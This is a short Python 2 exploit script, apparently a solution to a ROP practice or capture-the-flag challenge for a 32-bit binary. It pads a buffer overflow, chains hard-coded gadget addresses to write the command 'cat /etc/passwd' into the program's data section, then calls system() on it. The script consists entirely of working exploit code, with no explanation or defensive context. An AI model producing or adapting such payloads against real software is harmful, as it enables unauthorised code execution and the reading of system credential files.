import struct
crap = "A" * 44

def stringpacker(addr):

    return str(struct.pack("<I",addr))


data_section = 0x804a028
system_call = 0x0804865a
mov_edi_ebp = 0x08048670
pop_edi_pop_ebp = 0x080486da


def writeStringToLocation(inputString, location):
    if len(inputString) % 4 == 0:
        inputString += "\x00" * 4
    else:
        inputString += (4-(len(inputString)%4)) * "\x00"

    payload = ""
    for i in xrange(0,len(inputString),4):
        payload += stringpacker(pop_edi_pop_ebp)
        payload += stringpacker(location+i)
        payload += inputString[i:i+4]
        payload += stringpacker(mov_edi_ebp)

    return payload


payload = crap
payload += writeStringToLocation("cat /etc/passwd",data_section)

payload += stringpacker(system_call)

payload += stringpacker(data_section)

print(payload)

